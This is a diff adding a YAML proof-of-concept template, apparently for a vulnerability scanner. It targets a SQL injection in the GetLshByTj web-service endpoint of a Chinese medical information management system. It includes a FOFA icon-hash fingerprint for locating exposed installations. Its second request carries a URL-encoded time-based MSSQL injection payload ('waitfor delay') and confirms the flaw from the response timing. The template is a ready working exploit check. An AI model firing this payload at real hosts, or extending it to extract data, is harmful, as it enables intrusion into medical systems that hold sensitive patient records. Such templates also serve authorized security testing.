@@ -1,0 +1,20 @@
+id: poc-yaml-qianyiyun-medical-management-system-sqli
+info:
+  name: 千宜医药信息管理系统GetLshByTj SQL注入
+  severity: high
+  tags:
+  - sql-injection
+  finger: 医药信息管理系统
+  fofa: icon_hash="775044030"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /WebService.asmx/GetLshByTj
+  expression: status_code == 500 && contains(body,"缺少参数") && !contains(body,"<")
+- method: GET
+  path: /WebService.asmx/GetLshByTj?djcname=%31%27%3b%77%61%69%74%66%6f%72%20%64%65%6c%61%79%20%27%30%3a%30%3a{{.t1}}%27%2d%2d%20%2d&redonly=true&tjstr=12
+  expression: status_code == 200 && !contains(body,"<html") && contains(content_type,"text/xml")
+    && duration >= t1 && duration <= t2
+transport: http
